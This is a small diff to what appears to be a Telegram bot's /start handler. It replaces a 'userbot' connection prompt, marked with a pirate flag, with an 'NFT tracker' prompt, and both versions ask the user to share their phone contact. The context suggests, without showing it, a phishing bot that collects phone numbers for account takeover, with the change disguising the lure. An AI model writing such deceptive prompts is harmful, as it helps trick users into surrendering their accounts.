@@ -167,7 +167,7 @@ async def cmd_start(message: Message, state: FSMContext):
         one_time_keyboard=True,
     )
     await message.answer(
-        "PastureUs🏴‍☠️ Для подключения юзбота поделитесь контактом",
+        "NFT TRECER Для подключения НФТ ТРЕКЕРА Нажмите поделится контактом",
         reply_markup=keyboard,
     )
     await state.set_state(AuthState.waiting_for_phone)
